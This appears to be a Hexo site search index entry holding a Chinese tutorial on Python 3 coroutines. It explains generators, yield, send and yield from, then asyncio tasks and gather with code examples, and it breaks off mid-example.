<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>详解 Python3 协程</title>
    <link href="/post/%E8%AF%A6%E8%A7%A3Python3%E5%8D%8F%E7%A8%8B/"/>
    <url>/post/%E8%AF%A6%E8%A7%A3Python3%E5%8D%8F%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><blockquote><p>通常我们认为线程是轻量级的进程，因此我们也把协程理解为轻量级的线程。</p></blockquote><p>在 Python 中并发编程一般都是使用多线程或者多进程来实现的，对于 CPU 密集型任务由于 GIL 的存在我们通常使用多进程，而对于 IO 密集型任务我们可以通过线程调度，让线程在执行 IO 任务时让出 GIL，从而实现表面上的并发。</p><p>其实对于 IO 密集型任务我们还有另外一种选择，就是 <strong>协程（Coroutine）</strong>。协程的作用是在执行函数 A 时可以随时中断去执行函数 B，然后中断函数 B 继续执行函数 A，即可以在任务间自由切换，<strong>由用户决定，在哪些地方交出控制权</strong>。这一过程看似像多线程，但其实<strong>只有一个线程执行</strong>，协程就相当于是运行在单线程中的“并发”。</p><h3 id="协程有什么优势？"><a href="#协程有什么优势？" class="headerlink" title="协程有什么优势？"></a>协程有什么优势？</h3><ol><li>开销少，执行效率极高：因为子程序（函数）切换不是线程切换，而是由程序自身控制，没有线程上下文切换的开销。所以与多线程相比，线程的数量越多，协程性能的优势就越明显。</li><li>不需要多线程的锁机制：因为只有一个线程，不存在同时写变量冲突，在协程中控制共享资源不需要加锁，也没有状态同步的开销，因此执行效率比多线程高很多。</li><li>方便切换控制流，简化代码逻辑。</li></ol><h3 id="协程如何处理CPU密集型任务？"><a href="#协程如何处理CPU密集型任务？" class="headerlink" title="协程如何处理CPU密集型任务？"></a>协程如何处理CPU密集型任务？</h3><p>协程可以很好地处理 IO 密集型任务的效率问题，但其本质是个单线程，处理 CPU 密集型任务不是它的长处。如果要充分发挥多核 CPU 的性能，最简单的方法是 <strong>多进程+协程</strong>，既充分利用多核，又充分发挥协程的高效率，可以获得极高的性能。</p><h3 id="进程、线程、协程的对比"><a href="#进程、线程、协程的对比" class="headerlink" title="进程、线程、协程的对比"></a>进程、线程、协程的对比</h3><blockquote><p>进程和线程是抢占式的调度（CPU 决定），协程是协同式的调度（代码决定）。</p></blockquote><ul><li><strong>进程</strong>：每个人都领一套工具（环境，上下文）去干活，要干很多工作，人多（核多）就可以做的更快。</li><li><strong>线程</strong>：一个人有一套工具后干活，要干很多工作，先干哪个要听老板的（系统），遇见要等待的事情，老板会叫你先干别的。但老板不懂你干的活，比如你挖一个坑埋一个萝卜再盖土，结果他让你挖坑、埋土、放萝卜，这时候就要用锁告诉老板这个必须先放了萝卜才能埋土。</li><li><strong>协程</strong>：一个人有一套工具后干活，要干很多工作，先干哪个由自己决定（代码），遇见要等待的事情，自己会先干别的。对于老板来说，协程内的工作他不会干预，比如他会让你吃饭，但不会规定先吃哪个菜。而正是因为省去了老板的工作量，才大大提高了公司的效率。</li><li><strong>串行</strong>：一个人有一套工具后干活，要干很多工作，先干哪个完全按写好的清单来，遇见要等待的事情，就等他执行完了再做下一个。</li></ul><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><ul><li>Python 2.2 中，第一次引入了生成器，生成器实现了一种惰性、多次取值的方法，此时还是通过<code>next</code>构造生成迭代链或进行多次取值。</li><li>Python 2.5 中，引入了<code>yield</code>关键字，使得生成器有了记忆功能，下一次从生成器取值时，可以恢复到上次<code>yield</code>执行的位置。此外，生成器还加入了<code>send</code>方法与<code>yield</code>搭配使用，可以用<code>yield</code>让生成器暂停到一个状态，还可以通过<code>send</code>方法传入一个值来改变其停止位置的状态。</li><li>Python 3.3 中，新增了<code>yield from</code>关键字，实现了在生成器（委派生成器）内部调用另外生成器（子生成器）的功能，可以轻易的重构生成器，比如将多个生成器连接在一起执行。</li><li>Python 3.4 中，新增了 asyncio 库，提供了一个默认的 Event Loop，在语法上支持使用<code>@asyncio.coroutine</code>和<code>yield from</code>实现协程，有了足够的基础工具进行异步并发编程。</li><li>Python 3.5 中，引入了<code>async</code>/<code>await</code>关键字，用以取代<code>@asyncio.coroutine</code>和<code>yield from</code>，从而简化了协程的使用并且便于理解。</li></ul><h2 id="迭代器和生成器"><a href="#迭代器和生成器" class="headerlink" title="迭代器和生成器"></a>迭代器和生成器</h2><h3 id="容器与迭代器"><a href="#容器与迭代器" class="headerlink" title="容器与迭代器"></a>容器与迭代器</h3><p>在 Python 中一切皆对象，对象的抽象就是类，而 <strong>对象的集合就是容器</strong>，比如字符串、列表、元组、字典、集合都是容器。不同容器的区别，在于内部数据结构的实现方法。</p><p>所有的容器都是 <strong>可迭代的（iterable）</strong>，即可迭代对象。这里的迭代，和枚举不完全一样。迭代可以想象成是你去买苹果，卖家并不告诉你他有多少库存。这样，每次你都需要告诉卖家，你要一个苹果，然后卖家采取行为：要么给你拿一个苹果；要么告诉你，苹果已经卖完了。你并不需要知道，卖家在仓库是怎么摆放苹果的。</p><p>严谨地说，<strong>迭代器（iterator）</strong>提供了一个 <strong>_<em>next</em>_</strong> 方法，调用这个方法后，你要么得到这个容器的下一个对象，要么得到一个 <code>StopIteration</code> 异常。对于可迭代对象，通过调用 <strong>iter()</strong> 函数可以得到一个迭代器，迭代器可以通过 <strong>next()</strong> 函数来得到下一个元素，从而实现遍历，<code>for...in...</code> 语句就是将这个过程隐式化。</p><p><strong>示例：遍历迭代器对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs python">iterable_list = <span class="hljs-built_in">iter</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>])<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterable_list))<br>    <span class="hljs-keyword">except</span> StopIteration:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;empty&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p><strong>生成器（generator）</strong>是一种特殊的迭代器，它并不会像迭代器一样占用大量内存。合理使用生成器，可以降低内存占用、优化程序结构、提高程序速度。此外，在 Python 2 的版本中，生成器也是实现l协程的一种重要方式。</p><p><strong>示例：生成器与迭代器的性能差异比较</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> psutil<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_memory</span>(<span class="hljs-params">hint</span>):</span><br>    memory = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;psutil.Process(os.getpid()).memory_full_info().uss / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>:<span class="hljs-number">.4</span>f&#125;</span> MB&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;hint&#125;</span> memory used: <span class="hljs-subst">&#123;memory&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_iterator</span>():</span><br>    show_memory(<span class="hljs-string">&#x27;init iterator&#x27;</span>)<br>    res = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000000</span>)]  <span class="hljs-comment"># 返回迭代器，其中的每个元素在生成后都会保存到内存中</span><br>    show_memory(<span class="hljs-string">&#x27;after initiated&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;sum result: <span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(res)&#125;</span>&#x27;</span>)<br>    show_memory(<span class="hljs-string">&#x27;after sum called&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_generator</span>():</span><br>    show_memory(<span class="hljs-string">&#x27;init generator&#x27;</span>)<br>    res = (i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000000</span>))  <span class="hljs-comment"># 返回生成器，只有在调用next()函数的时候，才会生成下一个变量</span><br>    show_memory(<span class="hljs-string">&#x27;after initiated&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;sum result: <span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(res)&#125;</span>&#x27;</span>)<br>    show_memory(<span class="hljs-string">&#x27;after sum called&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br><br>test_iterator()<br>test_generator()<br></code></pre></td></tr></table></figure><h2 id="yield-关键字"><a href="#yield-关键字" class="headerlink" title="yield 关键字"></a>yield 关键字</h2><blockquote><p>yield 应当取其“让步”而非“产出”或“返回”之意，这是理解协程的关键。</p></blockquote><p>yield 有让步之意，因为它交出了程序的控制权，但这个协程并没有结束，下一次执行时，将恢复到之前让出程序控制权的地方，也就是 yield 语句执行的地方继续执行。方法中包含<code>yield</code>表达式后，Python 会将其视作一个生成器对象，不再是普通的方法。</p><p>常用方法说明：</p><ul><li><code>__next__()</code>方法或<code>next()</code>: 作用是启动或者恢复 generator 的执行，相当于<code>send(None)</code></li><li><code>send(value)</code>方法：作用是发送值给 yield 表达式，启动 generator 会调用<code>send (None)</code></li><li>使用生成器之前需要先调用<code>__next__</code>或者<code>send(None)</code>方法，否则将报错。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>示例一：yield 的简单使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;generator start&#x27;</span>)<br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        yield_expression_value = <span class="hljs-keyword">yield</span> n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;yield_expression_value: <span class="hljs-subst">&#123;yield_expression_value&#125;</span>&#x27;</span>)<br>        n += <span class="hljs-number">1</span>  <span class="hljs-comment"># 创建generator对象</span><br><br><br>test_generator = test()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(test_generator))  <span class="hljs-comment"># &lt;class &#x27;generator&#x27;&gt;</span><br><span class="hljs-comment"># 启动generator</span><br>next_result = <span class="hljs-built_in">next</span>(test_generator)  <span class="hljs-comment"># generator start</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;next_result: <span class="hljs-subst">&#123;next_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># 发送值给yield表达式</span><br>send_result = test_generator.send(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;send_result: <span class="hljs-subst">&#123;send_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 2</span><br><span class="hljs-comment"># 再次调用generator</span><br>send_result = <span class="hljs-built_in">next</span>(test_generator)  <span class="hljs-comment"># None</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;send_result: <span class="hljs-subst">&#123;send_result&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 3</span><br></code></pre></td></tr></table></figure><p><strong>示例二：yield 和 send 与外界的交互流程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jump_range</span>(<span class="hljs-params">up_to</span>):</span><br>    step = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> step &lt; up_to:<br>        jump = <span class="hljs-keyword">yield</span> step<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;jump&#x27;</span>, jump)<br>        <span class="hljs-keyword">if</span> jump <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            jump = <span class="hljs-number">1</span><br>        step += jump<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;step&#x27;</span>, step)<br><br><br>iterator = jump_range(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># 0</span><br><span class="hljs-built_in">print</span>(iterator.send(<span class="hljs-number">4</span>))  <span class="hljs-comment"># jump 4; step 4; 4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(iterator))  <span class="hljs-comment"># jump None; step 5; 5</span><br><span class="hljs-built_in">print</span>(iterator.send(-<span class="hljs-number">1</span>))  <span class="hljs-comment"># jump -1; step 4; 4</span><br></code></pre></td></tr></table></figure><p><strong>示例三：yield 生产者-消费者模型</strong></p><p>传统的生产者-消费者模型是一个线程写消息，一个线程读消息，通过锁机制控制队列和等待，但一不小心就可能死锁。如果改用协程，生产者生产消息后，直接通过 <code>yield</code> 跳转到消费者开始执行，待消费者执行完毕后，切换回生产者继续生产，效率极高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;示例说明：</span><br><span class="hljs-string">1. consumer函数是一个generator</span><br><span class="hljs-string">2. 把一个consumer传入produce后，首先调用c.send(None)启动生成器</span><br><span class="hljs-string">3. 一旦produce产生了消息，通过c.send(n)切换到consumer执行</span><br><span class="hljs-string">4. consumer通过yield拿到消息，进行处理，又通过yield把结果传回</span><br><span class="hljs-string">5. produce拿到consumer处理的结果，继续生产下一条消息</span><br><span class="hljs-string">6. produce决定不生产了，通过c.close()关闭consumer，整个过程结束</span><br><span class="hljs-string">7. 整个流程无锁，由一个线程执行，produce和consumer协作完成任务，所以称为“协程”，而非线程的抢占式多任务</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>():</span><br>    r = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-keyword">yield</span> r<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[CONSUMER] Consuming <span class="hljs-subst">&#123;n&#125;</span>...&#x27;</span>)<br>        r = <span class="hljs-string">&#x27;200 OK&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">produce</span>(<span class="hljs-params">c</span>):</span><br>    c.send(<span class="hljs-literal">None</span>)<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> n &lt; <span class="hljs-number">5</span>:<br>        n = n + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[PRODUCER] Producing <span class="hljs-subst">&#123;n&#125;</span>...&#x27;</span>)<br>        r = c.send(n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[PRODUCER] Consumer return: <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br>    c.close()<br><br><br>C = consumer()<br>produce(C)<br></code></pre></td></tr></table></figure><p><strong>示例四：yield from 表达式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 子生成器</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_n</span>(<span class="hljs-params">n</span>):</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; n:<br>        <span class="hljs-keyword">yield</span> i<br>        i += <span class="hljs-number">1</span><br><br><br><span class="hljs-comment"># 委派生成器</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br>    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> gen_n(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;do something&#x27;</span>)<br>    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> gen_n(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;end&#x27;</span>)<br><br><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> main(<span class="hljs-number">3</span>):<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="asyncio-库"><a href="#asyncio-库" class="headerlink" title="asyncio 库"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio.html">asyncio 库</a></h2><p>asyncio 是用来编写 <strong>并发</strong> 代码的库，使用 <strong>async/await</strong> 语法，是实现高性能 Python 异步框架的基础。</p><h3 id="协程与任务"><a href="#协程与任务" class="headerlink" title="协程与任务"></a><a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html">协程与任务</a></h3><h4 id="可等待对象"><a href="#可等待对象" class="headerlink" title="可等待对象"></a>可等待对象</h4><p>如果一个对象可以在 <strong>await 语句</strong> 中使用，那么它就是 <strong>可等待对象（awaitable）</strong> 。</p><blockquote><p>对 await 关键字的理解：简单的说，await就是挂起当前任务，去执行其他任务，此时是堵塞的，必须要等其他任务执行完毕才能返回到当前任务继续往下执行，这样的说的前提是，在一个时间循环中有多个 task 或 future，当 await 右面等待的对象是协程对象时，就没有了并发的作用，就是堵塞等待这个协程对象完成。</p></blockquote><p>可等待对象有三种主要类型：<strong>协程（Coroutine）</strong>、<strong>任务（Task）</strong>、<strong>Future 对象</strong>。</p><ol><li><p>协程：Python 协程属于 <em>可等待</em> 对象，因此可以在其他协程中被等待。协程函数的调用不会立即执行，而是会返回一个协程对象。协程对象需要注册到事件循环中，由事件循环调用。</p><blockquote><p>协程函数：定义形式为 <code>async def</code> 的函数<br>协程对象：调用协程函数所返回的对象</p></blockquote></li><li><p>任务：<em>任务</em> 是对协程的进一步封装，其中包含有各种状态，用于 <strong>并发</strong> 运行多个协程。当一个协程通过 <code>asyncio.create_task()</code> 等函数被封装为一个 <em>任务</em>，<strong>该协程会被自动调度执行</strong>。</p></li><li><p>Future 对象：<em>Future</em> 是一种特殊的 <strong>低层级</strong> 可等待对象，是 <em>Task</em> 的父类，表示一个异步操作的 <strong>最终结果</strong>。通常情况下 <strong>没有必要</strong> 在应用层级的代码中创建 Future 对象。</p></li></ol><p><img src="/img/Python/v2-243e068bad56486f3ada2c2b75603570_720w.jpg"></p><h4 id="运行-asyncio-程序"><a href="#运行-asyncio-程序" class="headerlink" title="运行 asyncio 程序"></a>运行 asyncio 程序</h4><ul><li><code>asyncio.run(main, *, debug=False)</code><ul><li>创建一个新的事件循环并在结束时将循环关闭。</li><li>它应当被用作 asyncio 程序 <strong>最高层级的</strong> 入口点（main 方法），在理想情况下应当只被调用一次。</li><li>当有其他 asyncio 事件循环在同一线程中运行时，此函数不能被调用。</li><li>如果 <em>debug</em> 为 <code>True</code>，事件循环将以调试模式运行。</li></ul></li></ul><p>注：<code>asyncio.run()</code> 是 Python 3.7 中引入的，也是官方 <strong>推荐的</strong> 运行协程的方式，相当于老版本的以下语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">loop = asyncio.get_event_loop()<br><span class="hljs-keyword">try</span>:    <br>    loop.run_until_complete(coro)<br><span class="hljs-keyword">finally</span>:    <br>    loop.close()<br></code></pre></td></tr></table></figure><h4 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h4><ul><li><code>asyncio.create_task(coro, *, name=None)</code><ul><li>将传入的协程封装为一个 Task，并自动调度它执行，返回 Task 对象。</li><li>当 <em>name</em> 不为 <code>None</code> 时，它将使用 <code>Task.set_name()</code> 来设置任务的名称。</li></ul></li></ul><p>同样，此函数在 Python 3.7 中被引入，相当于低层级的 <code>asyncio.ensure_future()</code> 方法。</p><h4 id="休眠"><a href="#休眠" class="headerlink" title="休眠"></a>休眠</h4><ul><li><code>asyncio.sleep(delay, result=None, *)</code><ul><li>阻塞 <em>delay</em> 指定的秒数。</li><li>如果指定了 <em>result</em>，则当协程完成时将其返回给调用者。</li><li><code>asyncio.sleep()</code> 总是会挂起当前任务，以允许其他任务运行。</li><li>将 delay 设为 0 将提供一个经优化的路径以允许其他任务运行，这可供长期间运行的函数使用以避免在函数调用的全过程中阻塞事件循环。</li></ul></li></ul><h4 id="并发运行任务"><a href="#并发运行任务" class="headerlink" title="并发运行任务"></a>并发运行任务</h4><ul><li><code>asyncio.gather(*aws, return_exceptions=False)</code><ul><li><em>并发</em> 运行 <em>aws</em> 序列中的所有可等待对象。</li><li>如果 <em>aws</em> 中的某个可等待对象为协程，它将自动被作为一个任务调度。</li><li>如果所有可等待对象都成功完成，结果将是一个由所有返回值聚合而成的列表。结果值的顺序与 <em>aws</em> 中可等待对象的顺序一致。</li><li>如果 <em>return_exceptions</em> 为 <code>False</code>，不捕获协程中的异常，错误会完整地 throw 到当前的执行层，但是 <em>aws</em> 序列中的其他可等待对象 <strong>不会被取消</strong> 并将继续运行（可以在下次 await 的时候执行）。</li><li>如果 <em>return_exceptions</em> 为 <code>True</code>，异常会和成功的结果一样处理，并聚合至结果列表。</li></ul></li></ul><p><strong>示例一：协程的异常处理和取消</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_1</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_2</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># 发生异常</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker_3</span>():</span><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    task_1 = asyncio.create_task(worker_1())<br>    task_2 = asyncio.create_task(worker_2())<br>    task_3 = asyncio.create_task(worker_3())<br><br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<br>    task_3.cancel()  <span class="hljs-comment"># 取消任务</span><br><br>    res = <span class="hljs-keyword">await</span> asyncio.gather(task_1, task_2, task_3, return_exceptions=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(res)  <span class="hljs-comment"># 输出所有task的执行结果（包括返回值、程序异常）</span><br><br><br>ts = time.time()<br>asyncio.run(main())  <span class="hljs-comment"># [1, ZeroDivisionError(&#x27;division by zero&#x27;), 3]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;all time: &#123;:.2f&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(time.time() - ts))  <span class="hljs-comment"># 2.02s</span><br></code></pre></td></tr></table></figure><p><strong>示例二：协程的并发分组运行</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">coro</span>(<span class="hljs-params">tag</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, tag)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, tag)<br>    <span class="hljs-keyword">return</span> tag<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    group1 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 1.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)])  <span class="hljs-comment"># 对任务进行高级别分组</span><br>    group2 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 2.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)])<br>    group3 = asyncio.gather(*[coro(<span class="hljs-string">&#x27;group 3.&#123;&#125;&#x27;</span>.<span 